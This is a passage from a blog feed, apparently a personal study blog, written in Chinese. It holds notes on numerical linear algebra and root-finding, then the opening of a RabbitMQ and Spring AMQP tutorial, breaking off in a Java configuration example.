的<u><strong>几何重数和代数重数是否相等</strong></u>？</p><p>如果相等，表示 $A$ 所代表的线性变换没有改变被变换方的维度，因此 $A$ 可以分解为 $n$ 个线性无关的正交基向量。也就是可以相似对角化。如果不满足，则无法相似对角化。</p></li><li><p>最后将特征向量与特征值对应起来：$\Lambda=\text{diag}(\lambda_1,\lambda_2,\ldots,\lambda_n)$，$P=(\alpha_1,\alpha_2,\ldots,\alpha_n)$，则 $P^{-1}AP=\Lambda$；</p></li></ol><h2 id="5-3-Definition-of-Spectrum-Radius-in-Matrix"><a href="#5-3-Definition-of-Spectrum-Radius-in-Matrix" class="headerlink" title="5.3 Definition of Spectrum Radius in Matrix"></a>5.3 Definition of Spectrum Radius in Matrix</h2><p>引入一个新的定义：矩阵的谱半径（或称 “矩阵的谱”）。</p><p><strong>谱半径的意义？</strong></p><ul><li>估计一个矩阵的特征值；</li><li>计算一个不可逆矩阵的广义逆矩阵；</li><li>……</li></ul><p><strong>谱半径的计算？</strong></p><p>$\rho(A)=\max\limits_i|\lambda_i|$（矩阵 $A$ 的谱半径等于其<u>所有特征值的模的最大值</u>。<strong>注意特征值包含复数！</strong>）；</p><p><strong>谱半径和范数的关系？</strong></p><p>谱半径和矩阵范数一样，都是矩阵的函数：$f:R^{m\times n}\rightarrow R$；</p><p>但是它们二者本质上真的不一样，一定要和 2-诱导范数（也就是谱范数）区分开。</p><p>二者间有一些重要结论：</p><ul><li><p>任意复数域上的矩阵 $A$，其谱半径 $\rho(A)$ 不大于 $A$ 的任何一种诱导范数，即：$\rho(A)\le||A||$；</p><blockquote><p>含义：<u>矩阵的谱半径是其任意一种范数的下界</u>；</p><p>作用：使用方便求解的范数对谱半径进行估算；</p></blockquote></li><li><p><code>Gelfand</code> 定理：$\rho(A)=\lim\limits_{k\rightarrow\infty}||A^k||^{1/k}$；</p><ul><li>矩阵序列 $I,A,A^2,\ldots,A^k,\ldots$ 收敛于 0 的充要条件：$\rho(A)\lt1$；</li><li>级数 $I+A+A^2+\cdots$ 收敛于 $(I-A)^{-1}$ 的充要条件：$\rho(A)\lt1$；</li></ul></li></ul><h2 id="5-4-Extend-to-mathbf-C-m-times-n"><a href="#5-4-Extend-to-mathbf-C-m-times-n" class="headerlink" title="5.4 Extend to $\mathbf{C^{m\times n}}$"></a>5.4 Extend to $\mathbf{C^{m\times n}}$</h2><p>现在将线性空间扩展到复数域，我们多出如下定义：</p><ul><li><p>共轭转置 $A^H$；</p></li><li><p>厄密矩阵（Hermitian Matrix）：$A^H=A$；</p><blockquote><p>注意和实对称矩阵不一样。</p><p>由量子力学的厄密算符可以得到如下所有结论（量子力学考题）：</p><ul><li>厄密矩阵所有特征值为实数；</li><li>厄密矩阵属于不同特征值的特征向量相互正交；</li><li>……</li></ul></blockquote><p>厄密矩阵因为是复数域上，和实数域上的实对称矩阵很相似（不如说实对称矩阵是厄密矩阵的特殊情况），所以厄密矩阵和实对称矩阵一样，二者一定可以相似对角化（几何重数一定等于代数重数，或者说一定有 $n$ 个线性无关的基向量）；</p><p>它们相似对角化很简单：$A=X^{-1}\Lambda X=X^T\Lambda X$（显然 $X$ 是正交矩阵）；</p></li></ul><p>再引入一些 “奇怪” 的运算：</p><p>对于一个 半正定/正定 的对称矩阵 $A\in S_{+}$，定义其平方根：$A^{1/2}$，因为一定能找到 $P$ 使得 $P^2=A$；</p><h2 id="5-5-Application-Use-Matrices-to-Solve-Problems"><a href="#5-5-Application-Use-Matrices-to-Solve-Problems" class="headerlink" title="5.5 Application: Use Matrices to Solve Problems"></a>5.5 Application: Use Matrices to Solve Problems</h2><ul><li><p>例如 $\vec{y}^\prime=\lambda\vec{y}$，可以看成一个求导变换 $D\vec{y}=\lambda\vec{y}$，求 $D$ 的特征向量就是 $\vec{y}$ 的解；</p></li><li><p>照片曝光的例子：数据集中有 $n$ 个数据，$\omega_{ij}\ge0$ 表示第 $i$ 和 $j$ 数据集之间的某个指标的相似性，$\omega_{ij}=\omega_{ji}$；我们想将这些数据集以这个指标 $x_i$ 衡量起来，要求相似性越高的数据，$x_i$ 的值也应该相近；</p><p>为了完成这个任务，可以定义一个目标函数 $\sum\limits_{ij}\omega_{ij}(x_i-x_j)^2$，对它最小化优化就行。</p><p>但是需要一些限制条件，防止 $x_i\equiv const$ 无意义的情况，例如 2-范数为 1 $||\vec{x}||_2^2=1$（归一化）、$\vec{1}\cdot\vec{x}=0$（指标 $x_i$ 均值为 0，方便统计）；</p><p>所以目标函数可以简化为：$2x^T(A-W)x$，其中 $W=(\omega_{ij})_{n\times n}$；找到 $A-W$ 的第二小特征值（最小特征值是 0，已经被限制条件排除了）对应的特征向量就是解。</p></li></ul><ul><li>计算 $A^k$：</li></ul><p>对一个实对称阵 $A$，假设其特征值 $\lambda_1,\ldots,\lambda_n$ 从大到小排列（$\lambda_{i+1}\ge\lambda_{i}$），那么它由实对称阵特征向量的完备性，我们可以用 $A$ 特征向量 $(x_1,\ldots,x_n)$ 来表示任意 $n$ 维向量：$A\vec{v}=c_1A\vec{x_1}+\cdots+c_nA\vec{x_n}=c_1\lambda_1\vec{x_1}+\cdots+c_n\lambda_n\vec{x_n}$（和量子力学将力学量使用它对应的算符的本征函数展开是一样的）；</p><p>因此我们发现，$A^k$ 对 $\vec{v}$ 作用的效果就取决于最大的特征值及其特征向量了：</p><p><img src="imgs2/spec.png" width="500px"></p><p>$A^k\vec{v}\approx c_1\lambda_1^k\vec{x_1},\space\text{assume that}\space c_1\ne0,\lambda_1\gt\lambda_2$（$k$ 要求足够大）；</p><blockquote><p>问题是，如果 $|\lambda_1|\gt1$ 时，$A^k\vec{v}\rightarrow\infty$，所以每次迭代都做一次归一化即可：</p><p>$\vec{\omega_k}=A\vec{v_{k-1}},\space\text{ where }\vec{\omega_{k}}=\dfrac{\vec{v_{k-1}}}{||\vec{v_{k-1}}||}$；</p><p>所以通过这个 power iteration 方法我们就能估计出 $A$ 的最大特征值；</p></blockquote><p>又注意到 $A$ 特征值的倒数，<strong>正好是</strong> $A^{-1}$ 对应的特征值：$A\vec{v}=\lambda\vec{v}\Rightarrow A^{-1}\vec{v}=\dfrac{1}{\lambda}\vec{v}$；</p><p>那么对 $A^{-1}$ 进行 power iteration，就能得到 $A$ 的最小特征值。</p><blockquote><p>$A^{-1}$ 的 power iteration 可以借助 $LU$ 分解加速。</p></blockquote><p>另外，由于正确结果收敛较慢，因此我们可以使用 “shifted inverse iteration”：</p><p>$A\vec{v}=\lambda\vec{v}\Rightarrow(A-\sigma I)\vec{v}=(\lambda-\sigma)\vec{v}$，可以得到如下的迭代过程（猜测 $\sigma_k\approx\lambda_k$）：</p><script type="math/tex; mode=display">\vec{\omega_k}=(A-\sigma_k I)^{-1}\vec{v_{k-1}},\space\vec{v_k}=\dfrac{\vec{\omega_k}}{||\vec{\omega_k}||},\space \sigma_{k+1}=\dfrac{\vec{v_{k}}^TA\vec{v_k}}{||\vec{v_k}||_2^2}</script><h2 id="5-6-Similarity-Transformations"><a href="#5-6-Similarity-Transformations" class="headerlink" title="5.6 Similarity Transformations"></a>5.6 Similarity Transformations</h2><ul><li><p>借助 QR 分解进行相似变换：$A=QR$，则 $Q^{-1}AQ=RQ$，所以可以迭代：$A_{k+1}=R_kQ_k,\space A_k=Q_kR_k$；</p><p>好的结论：$A_\infty=Q_\infty R_\infty=R_\infty Q_\infty$；</p></li></ul><h2 id="5-7-SVD-Singular-Value-Decomposition"><a href="#5-7-SVD-Singular-Value-Decomposition" class="headerlink" title="5.7 SVD (Singular Value Decomposition)"></a>5.7 SVD (Singular Value Decomposition)</h2><p>回忆一个矩阵的诱导范数：</p><script type="math/tex; mode=display">||A||=\max_{\vec{x}\ne0}\dfrac{||A\vec{x}||}{||\vec{x}||}=\max\limits_{||\vec{x}||=1}||A\vec{x}||</script><p>注意到 $||\vec{v}||=1$ 时，$||A||^2=||A\vec{v}||^2=\vec{v}A^TA\vec{v}$，因此只需要</p><p>特征值只有方阵才能讨论。有没有一种研究矩阵更普遍特征性质的分解呢？它就是奇异值分解。</p><p>可以证明，任何矩阵可以分解为：$A=U\Sigma V^{-1}$，其中 $U,V$ 为正交矩阵，$\Sigma$ 为对角矩阵（可以不是方阵）；</p><p>在物理上 $U,V$ 表示旋转变换（rotation），$\Sigma$ 表示伸缩变换（scale）；</p><p>那么 $U$、$V$ 代表什么？</p><p>我们发现：$A^TA=V(\Sigma^T\Sigma)V^T$，显然 $\Sigma^T\Sigma$ 是个对角方阵。而 $A^TA$ 有很好的性质：它是半正定、对称矩阵。</p><p>因此我们惊喜地发现，这就相当于对 $A^TA$ 完成了相似对角化。$\Sigma^T\Sigma$ 对角元存放的是 $A^TA$ 的特征值，$V$ 的列存放的是 $A^TA$ 对应的特征向量；</p><p>同理，$AA^T=U(\Sigma^T\Sigma)U^T$，所以，我们得出以下结论：</p><ul><li>$U$ 和 $V$ 分别是 $AA^T$ 和 $A^TA$ 的归一化特征向量组成的正定矩阵；</li><li>$U$ 和 $V$ 特征值<u>按序相同</u>（从大到小排列），对于实矩阵而言都大于等于 0；</li></ul><p>SVD 分解还可以写成一系列 $U,V$ 向量的外积线性组合：$A=\sum\sigma_i\vec{u_i}\vec{v_i}^T$；</p><p>SVD 可以有哪些用处？比如定义一个一般矩阵的 “伪逆”（pseudo inversion）：</p><script type="math/tex; mode=display">A^{+}=V\Sigma^{+}U^T</script><p>注意，对不一定为方阵的对角阵的伪逆：$\Sigma^{+}$ 就是将 $\Sigma$ 对角元的元素求倒数，放在对角位置，并且转置矩阵的长宽。</p><p>伪逆有一些很好的性质：</p><ul><li>当 $A$ 为可逆方阵时，$A^+=A^{-1}$；</li><li>当 $A$ 的行秩大于列秩时（overdetermined），$A^+\vec{b}$ 给出了最小二乘结果；</li><li>当 $A$ 的列秩大于行秩时（underdetermined），$A^+\vec{b}$ 给出了 $A\vec{x}\approx\vec{b}$ 的最小二乘结果；</li></ul><h3 id="5-7-1-Application-Orthogonal-Procrustes-Theorem"><a href="#5-7-1-Application-Orthogonal-Procrustes-Theorem" class="headerlink" title="5.7.1 Application: Orthogonal Procrustes Theorem"></a>5.7.1 Application: Orthogonal Procrustes Theorem</h3><p>考虑一个问题：将一组向量 $A$ 通过正交变换的方式映射到新的一组向量 $QA$，让这组新的向量与给定的一组向量 $B$ 的差异尽可能的小（使用 Frobenius 范数衡量）。这在图像处理领域比较常用。</p><p>用数学方法表达就是，求正交阵：$\hat{Q}=\arg\min\{||QA-B||_{F}\}$（易知，$A,B$ 规模相同）；</p><p>由于 Frobenius 范数可以表达为 $||C||_F=\sqrt{\mathrm{tr}(C^TC)}$，故上式可计算：</p><script type="math/tex; mode=display">\begin{aligned}\hat{Q}&=\arg\min\{\mathrm{tr}((QA-B)^T(QA-B))\}\\&=\arg\min\{\mathrm{tr}(((QA)^T-B^T)(QA-B))\}\\&=\arg\min\{\mathrm{tr}((A^TQ^T-B^T)(QA-B))\}\\&=\arg\min\{\mathrm{tr}(A^TQ^TQA-BA^TQ^T-B^TQA+B^TB)\}\\&=\arg\min\{\mathrm{tr}(A^TA+B^TB-A^TQ^TB-(A^TQ^TB)^T)\}\\&=\arg\min\{\mathrm{tr}(A^TA)+\mathrm{tr}(B^TB)-2\mathrm{tr}(A^TQ^TB)\}\\\end{aligned}</script><p>注意到前两项在确定问题时就已知，所以最小化问题直接转换为最大化问题：</p><script type="math/tex; mode=display">\begin{aligned}\hat{Q}&=\arg\max\{\mathrm{tr}(A^TQ^TB)\}\\&=\arg\max\{\mathrm{tr}(Q^TBA^T)\}\\\end{aligned}</script><p>（注意 $\mathrm{tr}(PQ)=\mathrm{tr}(QP)$）</p><p>下面利用 SVD 分解做一个巧妙变换（假设 $BA^T=U\Sigma V^T$）：</p><script type="math/tex; mode=display">\begin{aligned}\hat{Q}&=\arg\max\{\mathrm{tr}(Q^TBA^T)\}\\&=\arg\max\{\mathrm{tr}(Q^TU\Sigma V^T)\}\\&=\arg\max\{\mathrm{tr}(V^TQ^TU\Sigma)\}\\\end{aligned}</script><p>这样 $V,Q,U$ 都是正交阵，所以 $V^TQ^TU$ 也是正交阵。</p><p>可以简单地证明，$\mathrm{tr}(QA)$ 最大（$Q$ 正交阵）时，$Q=I$；</p><p>此时 $\hat{Q}^T=VU^T$，$\hat{Q}=UV^T$；</p><p>所以这里我们利用 SVD 解出了正交普鲁克定理：</p><p>当 $Q=UV^T$（其中 $BA^T=U\Sigma V^T$）时，$||QA-B||_F$ 有最小值。</p><h3 id="5-7-2-Application-Principal-Component-Analysis-PCA"><a href="#5-7-2-Application-Principal-Component-Analysis-PCA" class="headerlink" title="5.7.2 Application: Principal Component Analysis (PCA)"></a>5.7.2 Application: Principal Component Analysis (PCA)</h3><p>再考虑一个问题，对于相当大的一个数据集，它包含很多维度，我们基于以下目的需要降维：</p><ul><li>使得数据集更易使用；</li><li>降低算法的计算开销；</li><li>去除噪声；</li><li>使得结果容易理解；</li></ul><p>有一种降维方法就是主成分分析方法（PCA），其主要思想是将 $n$ 维特征映射到 $k$ 维上，这k维是全新的正交特征也被称为主成分，是在原有 $n$ 维特征的基础上重新构造出来的 $k$ 维特征；</p><p>可以证明：</p><p>最小化 $||X-CC^TX||_F$（其中 $C\in\mathbf{R^{n\times k}}$，$C^TC=I_{k\times k}$，$C$ 是 $U$ 的前 $k$ 列向量，$X=U\Sigma V^T$）取得的 $C$ 就是 $X$ 的主成分。</p><h1 id="Chapter-6-Non-linear-System"><a href="#Chapter-6-Non-linear-System" class="headerlink" title="Chapter 6. Non-linear System"></a>Chapter 6. Non-linear System</h1><h2 id="6-1-Root-Finding"><a href="#6-1-Root-Finding" class="headerlink" title="6.1 Root Finding"></a>6.1 Root Finding</h2><p>作出一些假设：</p><ul><li><p>连续性；</p><blockquote><p>连续函数满足的定理：中值定理；</p></blockquote></li><li><p>Lipschitz 特性：绝对值增长速率不快于一阶线性函数；</p></li><li><p>$k$ 阶导存在且连续；</p></li></ul><p><strong><u>方法一：二分法（bisection）</u></strong>，利用中值定理锁定根的区间（高中内容），直到根的区间小于一定范围就停止迭代。</p><ul><li><p>优点：无条件收敛（unconditionally converge）；</p><blockquote><p>收敛速度？指数速度减小。</p><p>$|x-x^*|\lt E_k$，其中 $E_k$ 为第 $k$ 轮迭代时的区间宽度（$E_k\le\dfrac{1}{2}E_{k-1},\space E_k=|r_k-l_k|$）；</p></blockquote></li><li><p>缺点：对函数性质要求严格。</p></li></ul><p><strong><u>方法二：不动点法（fixed point）</u></strong>，通过迭代求解 $g(x^<em>)=x^</em>$ 来得到 $f(x)=g(x)-x$ 的零点。</p><p>怎么迭代？方法比较多，但是常用的是最简单的策略：</p><p>simple strategy：将 $g(x_{k-1})$ 作为下一轮迭代的 $x_k$ 的值，直至 $|g(x_k)-x_k|$ 小于一定范围；</p><ul><li><p>优点：计算简单；</p></li><li><p>缺点：$g$ 必须满足 Lipschitz 特性，或者在根 $x^*$ 及迭代范围附近满足 Lipschitz 局部特性，否则迭代发散。</p><blockquote><p>对于满足 Lipschitz 特性的情况，$E_k\le cE_{k-1}$（linear）；</p><p>对于其他一般情况：$E_k=|x_k-x^<em>|=|g(x_{k-1})-g(x^</em>)|\le\dfrac{1}{2}(|g^{\prime\prime}(x^*)|+\varepsilon)E_{k-1}^2$（quadratic）； </p></blockquote></li></ul><p><strong><u>方法三：牛顿法（Newton’s method）</u></strong>，这个方法作出了一个假设，认为函数在零点附近近似线性，可以给出一个猜测值 $x_0$，求该点处切线 $l_0$，取得 $l_0$ 与 x 轴交点为 “更接近零点的点” $x_1$，重复迭代直至稳定。</p><script type="math/tex; mode=display">x_{k+1}=x_k-\dfrac{f(x_k)}{f^\prime(x_k)}</script><p>可以看作求 $g(x)=x-\dfrac{f(x_k)}{f^\prime(x_k)}$ 的不动点。</p><ul><li>优点：在简单情况下收敛很快；</li><li>缺点：<ol><li>$g$ 需要满足局部 Lipschitz 特性，否则不收敛（收敛速度和不动点法同理）；</li><li>$f^\prime(x^*)\ne0$，否则永远无法得到正确解；</li><li>某些函数难以求导数。</li></ol></li></ul><p><strong><u>方法四：割线法（secant method）</u></strong>，利用两相近点间的割线近似为切线的思想（$f^\prime(x)\approx\dfrac{f(x_1)-f(x_2)}{x_1-x_2},\space |x_1-x_2|\rightarrow0$），可以借助两次猜测的点的连线（割线）视作切线：$f^\prime(x_k)\approx\dfrac{f(x_k)-f(x_{k-1})}{x_k-x_{k-1}}$，结合牛顿法解决：</p><script type="math/tex; mode=display">x_{k+1}=x_k-\dfrac{f(x_k)}{f^\prime(x_k)}\approx x_k-\dfrac{f(x_k)(x_k-x_{k-1})}{f(x_k)-f(x_{k-1})}</script><ul><li>优点：计算稍微简单一点；</li><li>缺点：和牛顿法一样存在收敛问题。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-1-Basic-Concepts&quot;&gt;&lt;a href=&quot;#Chapter-1-Basic-Concepts&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1. Basic Concepts&quot;&gt;&lt;/a&gt;Chapter 1. Ba</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="Math" scheme="https://blog.sjtuxhw.top/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Rabbit MQ</title>
    <link href="https://blog.sjtuxhw.top/technical/rabbit-mq/"/>
    <id>https://blog.sjtuxhw.top/technical/rabbit-mq/</id>
    <published>2024-06-01T08:31:33.000Z</published>
    <updated>2024-10-25T13:59:32.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-0-背景"><a href="#Chapter-0-背景" class="headerlink" title="Chapter 0. 背景"></a>Chapter 0. 背景</h1><h2 id="0-1-同步消息和异步消息"><a href="#0-1-同步消息和异步消息" class="headerlink" title="0.1 同步消息和异步消息"></a>0.1 同步消息和异步消息</h2><p>微服务架构下存在很多服务间相互调用的情况。</p><p>我们知道可以通过 <code>OpenFeign</code> 的方式来获取远程服务的响应，但是 <code>OpenFeign</code> 的远程调用是同步的，其优点是同步调用时效强，等待结果返回。但同时会导致：</p><ul><li>代码可扩展性差。</li><li>性能堪忧。相较于相同项目实现的单体架构，同步的微服务调用方式会多出网络等待时间。</li></ul><p>于是我们需要异步调用的方式，这里使用到了<strong>发布-订阅者模式</strong>。</p><p>异步调用的优势是，</p><ul><li>模块间进一步解耦（发布者和订阅者间无需知道相互之间的信息）；</li><li>可拓展性强（scalable），添加实例无需更改代码；</li><li>异步性能有明显提升；</li><li>故障隔离（<strong><u>最终一致性保证</u></strong>）；</li><li>缓存消息，实现流量削峰填谷；</li></ul><p>但是缺点也很明显：</p><ul><li>异步实现无法立即得到结果，时效性差，可能导致数据不一致性；</li><li>不作额外措施，则不能保证最终一致性（下游业务是否成功）。所以业务安全依赖于 broker 的可靠性；</li></ul><h2 id="0-2-Message-Queue-选型"><a href="#0-2-Message-Queue-选型" class="headerlink" title="0.2 Message Queue 选型"></a>0.2 Message Queue 选型</h2><div class="table-container"><table><thead><tr><th>Opt</th><th>RabbitMQ</th><th>ActiveMQ</th><th>RocketMQ</th><th>Kafuka</th></tr></thead><tbody><tr><td>Company</td><td>Rabbit（专一，社区极活跃）</td><td>Apache（大厂支持）</td><td>Alibaba（开源冲业绩）</td><td>Apache</td></tr><tr><td>Language</td><td>Erlang（面向并发的语言）</td><td>Java</td><td>Java</td><td>Scala&amp;Java</td></tr><tr><td>Protocol Support</td><td>AMQP,XMPP,SMTP,STOMP</td><td>OpenWire,STOMP,REST,XMPP,AMQP</td><td>私有协议，只能被 Java 调用（微服务语言限制）</td><td>私有协议</td></tr><tr><td>Availability</td><td>高</td><td>一般</td><td>高</td><td>高</td></tr><tr><td>Monolith Throughput（ops）</td><td>一般（数十万上下）</td><td>差</td><td>高（数十万）</td><td>极高（近数百万）</td></tr><tr><td>Latency</td><td>微秒级</td><td>毫秒级</td><td>毫秒级</td><td>毫秒以内</td></tr><tr><td>Reliability</td><td>高</td><td>一般</td><td>高</td><td>一般</td></tr></tbody></table></div><p>可以看出：</p><ul><li><p><code>Kafuka</code> 牺牲了部分可靠性（只确保最终一致性）、消息延迟，换取了极高的消息吞吐量。在对消息准确性要求不高（如日志传输）的情况下推荐；</p></li><li><p><code>RocketMQ</code> 虽然功能丰富，但是 <code>Alibaba</code> 的开源项目大多属于冲业绩，文档和社区支持不佳。</p><p>此外 <code>RocketMQ</code> 依赖于很多 <code>Alibaba</code> 技术栈，如果项目中不打算或者没有 <code>Alibaba</code> 的依赖，那么引入困难；</p><p>另外 <code>RocketMQ</code> 不支持主流协议，只支持他们自己的一套接口，微服务语言局限于 Java；</p></li><li><p><code>ActiveMQ</code> 是早期的项目，指标不如后辈；</p></li></ul><p>因此我们选择 <code>RabbitMQ</code>。</p><h1 id="Chapter-1-Introduction-to-RabbitMQ"><a href="#Chapter-1-Introduction-to-RabbitMQ" class="headerlink" title="Chapter 1. Introduction to RabbitMQ"></a>Chapter 1. Introduction to <code>RabbitMQ</code></h1><h2 id="1-1-架构"><a href="#1-1-架构" class="headerlink" title="1.1 架构"></a>1.1 架构</h2><p><img src="imgs/arch2.png"></p><ul><li><p><code>queue</code>：暂时存储消息的消息队列；队列有两类：</p><ul><li><p>durable queue：持久化队列，信息会被定期持久化到磁盘。这种队列可以提升可靠性，但是会降低性能；</p></li><li><p>non-durable queue：非持久化队列，信息总是保存在内存中。这种队列的速度会快于 durable queue，但是可靠性无法保证（例如不保证掉电不丢失数据）；</p></li></ul></li><li><p><code>virtual host</code>：虚拟主机，起到不同项目数据隔离作用；</p></li><li><p><code>exchange</code>：路由消息的交换机。其作用是接受发布者发送的消息，并将接收到的消息<strong><u>按照交换机的配置</u></strong>路由到所有与其绑定的队列中。本身不具备消息暂存能力；</p><p>交换机的配置（种类，或者说<strong>路由策略</strong>）大致有几种：</p><ul><li><p><code>Fanout</code>（广播）：<code>Fanout</code> 交换机。会将自身接受到的消息批量路由到<strong>所有与之关联的</strong>消息队列中；</p></li><li><p><code>Direct</code>（定向）：<code>Direct</code> 交换机。这种交换机 与 消息队列的关联时需要额外指定一个 <code>bindingKey</code>，并且发布者在向该种交换机发送消息时，必须指定 <code>routingKey</code>。</p><p>于是这种交换机只会将接受到的消息发送给 <code>bindingKey</code> 与这条消息的 <code>routingKey</code> 相同的消息队列中；</p><blockquote><p><code>bindingKey</code> 不要求对于交换机唯一。所以理论上 <code>Direct</code> 交换机的功能覆盖了 <code>Fanout</code> 交换机。</p></blockquote></li><li><p><code>Topic</code>（话题，类似 <code>Kafuka</code> 的按 Topic 订阅）：与 <code>Direct</code> 交换机类似，也以 <code>bindingKey</code> 和 <code>routingKey</code> 为路由依据，但：</p><ul><li><code>bindingKey</code> 这里是 topic，可以使用通配符：<code>#</code> 代表 0 到多个 topic，<code>*</code> 代表 1 个 topic；</li><li><code>routingKey</code> 可以是 topic 的组合，使用 <code>.</code>（period）隔开；</li></ul></li><li><p><code>Headers</code>（请求头）：<code>Headers</code> 交换机，</p></li></ul></li></ul><p>注意，交换机 和 消息队列间的关联需要显式声明 / 配置。</p><h2 id="1-2-Spring-AMQP"><a href="#1-2-Spring-AMQP" class="headerlink" title="1.2 Spring AMQP"></a>1.2 Spring <code>AMQP</code></h2><p><code>RabbitMQ</code> 支持多种协议，其中就包括 <code>AMQP</code>（Advanced Message Queuing Protocol），其他各种语言都有各自的 <code>AMQP</code> 的实现库。</p><p>为了方便起见，在 Spring 项目中常常使用 Spring 框架中实现好的 <code>AMQP</code> 协议接口来完成任务。</p><blockquote><p><code>spring-boot-starter-amqp</code> 依赖内部提供了针对 <code>AMQP</code> 协议的实现，只需引入该依赖即可操作 <code>RabbitMQ</code>；</p><p>引入后需要进行一些配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">port:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">virtual-host:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">...</span></span><br></pre></td></tr></table></figure></blockquote><ul><li>最简单使用：<code>RabbitTemplate.convertAndSend</code> &amp; <code>@RabbitListener</code>；</li></ul><h3 id="1-2-1-Working-Queues-模型"><a href="#1-2-1-Working-Queues-模型" class="headerlink" title="1.2.1 Working Queues 模型"></a>1.2.1 Working Queues 模型</h3><p>Working Queues 模型：多个消费者绑定到一个队列，共同消费队列中的消息；</p><ul><li>结论 1：队列中的消息<strong><u>最多只能被消费一次</u></strong>；所以多个 consumer 监听的情况下，一个消息被某个 consumer 消费后，不会存在于消费队列中被其他 consumer 消费（不存在消息重复）；</li><li>结论 2：队列传递给所有监听它的消费者的<strong><u>默认行为</u></strong>是绝对平均（<strong>轮询</strong>）的，没有考虑到各个机器消费消息的性能（可以用 <code>Thread.sleep</code> 测试）；</li></ul><p>为了改善这个模型下出现的问题，我们可以对这个默认的轮询机制调优：<u>规定每个消费者一次只能获取一条消息，处理完成后才能获取下一条消息</u>；</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在消费者（使用 `@RabbitListener` 注解）所在的模块中配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">listener:</span></span><br><span class="line">            <span class="attr">simple:</span></span><br><span class="line">                <span class="attr">prefetch:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="1-2-2-Fanout-Exchange"><a href="#1-2-2-Fanout-Exchange" class="headerlink" title="1.2.2 Fanout Exchange"></a>1.2.2 <code>Fanout</code> Exchange</h3><p>为什么需要广播交换机？考虑一个问题，假设一个发布者发布消息后，我们的业务逻辑要求同时有多个其他服务需要接收这个消息并且执行相应逻辑。举个例子，<code>consumer1</code> 和 <code>consumer2</code> 需要在 <code>publisher</code> 发送消息后各自接收一次消息（也就是都执行一次业务逻辑）。</p><p>如果没有广播交换，那么发布者发布的消息在全局范围内只能被一个消费者消费，这就没法实现多个服务都接受到发布者消息的需求了。</p><p>在这种需求下，我们只需要为每个微服务建立一个消息队列，并且对应监听；将这些队列与一个公共的 <code>fanout</code> 交换机关联，就能完成上面的需求。如下图所示：</p><p><img src="imgs/fanout.png"></p><blockquote><p>代码中，如果使用了 <code>fanout</code> 交换机，那么 <code>routingKey</code> 可以指定为空字符串 / <code>null</code>；</p></blockquote><h3 id="1-2-3-Direct-Exchange"><a href="#1-2-3-Direct-Exchange" class="headerlink" title="1.2.3 Direct Exchange"></a>1.2.3 <code>Direct</code> Exchange</h3><ul><li>路由交换机需要与消息队列以 <code>bindingKey</code> 绑定；一个交换机和一个消息队列可以绑定多个 <code>bindingKey</code>；</li><li><p><code>bindingKey</code> 和 <code>routingKey</code> 不存在通配符；</p></li><li><p>路由直接发送到 <code>bindingKey == routingKey</code> 的消息队列中；</p></li></ul><h3 id="1-2-4-Topic-Exchange"><a href="#1-2-4-Topic-Exchange" class="headerlink" title="1.2.4 Topic Exchange"></a>1.2.4 <code>Topic</code> Exchange</h3><ul><li>路由交换机需要与消息队列以 <code>bindingKey</code> 绑定；</li><li><code>bindingKey</code> 允许通配符，<code>#</code> 表示任意 0 至多个 topic，<code>*</code> 表示任意一个；</li><li>路由发送到所有匹配的消息队列中；</li></ul><h3 id="1-2-5-Spring-AMQP-声明交换机-amp-队列"><a href="#1-2-5-Spring-AMQP-声明交换机-amp-队列" class="headerlink" title="1.2.5 Spring AMQP 声明交换机 &amp; 队列"></a>1.2.5 Spring <code>AMQP</code> 声明交换机 &amp; 队列</h3><ul><li><code>Queue</code> 声明队列的类，也可以使用 <code>QueueBuilder</code> 工厂类创建；</li><li><code>Exchange</code> 声明交换机的类，也可以使用 <code>ExchangeBuilder</code> 工厂类创建；</li><li><code>Binding</code> 声明队列和交换机的绑定关系，<code>BindingBuilder</code>（常用）；</li></ul><h4 id="Method-1-Spring-Bean-Configuration-式声明"><a href="#Method-1-Spring-Bean-Configuration-式声明" class="headerlink" title="Method 1. Spring Bean Configuration 式声明"></a>Method 1. Spring Bean Configuration 式声明</h4><p>举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 通常在 consumer 段声明，因为 consumer 更需要关注交换机和队列的生成 */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FanoutConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FanoutExchange <span class="title 